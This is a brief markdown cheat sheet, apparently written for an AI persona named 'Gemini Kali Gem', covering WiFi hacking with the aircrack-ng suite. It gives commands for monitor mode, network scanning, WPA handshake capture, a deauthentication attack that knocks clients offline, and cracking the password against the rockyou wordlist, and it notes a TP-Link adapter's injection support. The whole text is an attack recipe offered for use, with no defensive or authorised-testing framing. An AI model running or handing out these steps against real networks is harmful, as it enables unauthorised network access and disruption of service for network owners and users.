# GEMINI KALI GEM - WiFi Hacking

## WiFi Commands

### Enable Monitor Mode
```
sudo airmon-ng start wlan0
```

### Scan Networks
```
sudo airodump-ng wlan0mon
```

### Capture Handshake
```
sudo airodump-ng -c CHANNEL --bssid MAC -w capture wlan0mon
```

### Deauth Attack
```
sudo aireplay-ng --deauth 10 -a MAC wlan0mon
```

### Crack Password
```
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

---

## Your Adapter: TP-Link TL-WN721N (AR9271)
- ✅ Monitor mode: YES
- ✅ Injection: YES
- ⚠️ 2.4GHz only
